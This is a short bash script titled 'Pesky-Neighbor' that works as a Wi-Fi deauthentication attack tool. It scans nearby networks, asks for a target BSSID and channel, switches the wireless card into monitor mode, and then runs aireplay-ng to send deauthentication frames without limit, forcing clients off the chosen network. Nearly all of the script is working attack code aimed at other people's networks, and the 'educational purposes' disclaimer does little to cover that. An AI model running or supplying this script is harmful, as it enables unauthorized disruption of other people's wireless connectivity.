#!/bin/bash
clear
echo "
=============================================================
Script: Pesky-Neighbor    | this is only for educational
Description: Deauth tool  | purposes. YAKM0 is not 
Author: YAKM0             | responsible for damages.
Email: YAKM0@pm.me        | Drink all the beer, 
Twitter: @Y4KM0           | hack all the things. -dualcore
=============================================================
"
mon='mon'
sleep 5
clear
echo "========================================================================"
nmcli dev wifi | awk '$2 != "--"' |awk '{print NR,$1,$2,$4}'
echo "========================================================================"
sleep 1
echo "
Copy targets BSSID and paste below WITH NO EXTRA SPACING
"
read Target
sleep 2
echo "type Targets channel below, channel number comes after network name, EX. target_network 6"
read Chan
clear
echo "You must start an interface in managed mode, ex. wlan0. Type which interface you want to start in managed mode below:"
read interface
while true; do
    read -p "You chose $interface, is this correct? " yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
sudo airmon-ng start $interface > /dev/null 2>&1
clear
sudo timeout 2s airodump-ng -d $Target -c $Chan $interface$mon > /dev/null 2>&1
sudo aireplay-ng -0 0 -a $Target $interface$mon --ignore-negative-one
sleep 3
clear
echo "Returning to managed mode"
sleep 2
sudo airmon-ng stop $interface$mon > /dev/null 2>&1
